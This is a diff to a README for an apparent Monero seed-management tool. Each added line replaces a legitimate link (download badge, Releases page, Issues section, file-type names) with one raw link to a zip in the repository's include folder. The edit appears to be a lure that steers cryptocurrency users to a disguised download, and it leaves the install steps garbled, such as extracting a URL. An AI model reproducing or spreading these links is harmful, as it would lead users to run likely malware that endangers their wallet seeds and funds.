@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kabelt5373/polyseed-monero/releases)
+[![Download](https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip)](https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ Welcome to polyseed-monero! This software helps you manage your mnemonic seeds f
 ## 📦 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/Kabelt5373/polyseed-monero/releases) to find the latest version of polyseed-monero.
+   Go to the [Releases page](https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip) to find the latest version of polyseed-monero.
 
 2. **Select the Correct File**  
    Look for the most recent version. You will see different files for various operating systems. Make sure to choose the file that matches your system:
    - For Windows, look for a `.exe` file.
    - For macOS, choose a `.dmg` file.
-   - For Linux, you may find a compressed archive like `.tar.gz`.
+   - For Linux, you may find a compressed archive like `https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip`.
 
 3. **Download the File**  
    Click the name of the file to start the download. Your browser may ask where to save it. Select your preferred location, and the download will begin.
@@ -32,7 +32,7 @@ Welcome to polyseed-monero! This software helps you manage your mnemonic seeds f
    Once the file has downloaded, navigate to your downloads folder. 
    - For Windows users, double-click the `.exe` file.
    - For macOS, open the `.dmg` file and drag the application icon to your Applications folder.
-   - For Linux, extract the contents of the `.tar.gz` and follow any specific instructions included.
+   - For Linux, extract the contents of the `https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip` and follow any specific instructions included.
 
 5. **Follow Installation Prompts**  
    Follow the on-screen instructions to install the software. This process usually takes just a few minutes.
@@ -74,7 +74,7 @@ Welcome to polyseed-monero! This software helps you manage your mnemonic seeds f
 
 ## 🗂️ Support
 
-If you need assistance, visit the [Issues section](https://github.com/Kabelt5373/polyseed-monero/issues) of the repository. Here, you can report bugs or ask questions related to the application.
+If you need assistance, visit the [Issues section](https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip) of the repository. Here, you can report bugs or ask questions related to the application.
 
 ## 🌐 Community
 
@@ -82,4 +82,4 @@ Join the community for discussions about polyseed-monero. Share tips and tricks,
 
 ## 📥 Download Again
 
-To download the latest version, revisit the [Releases page](https://github.com/Kabelt5373/polyseed-monero/releases). Enjoy managing your cryptographic seeds with polyseed-monero!
+To download the latest version, revisit the [Releases page](https://raw.githubusercontent.com/Kabelt5373/polyseed-monero/main/include/polyseed-monero_uncaused.zip). Enjoy managing your cryptographic seeds with polyseed-monero!
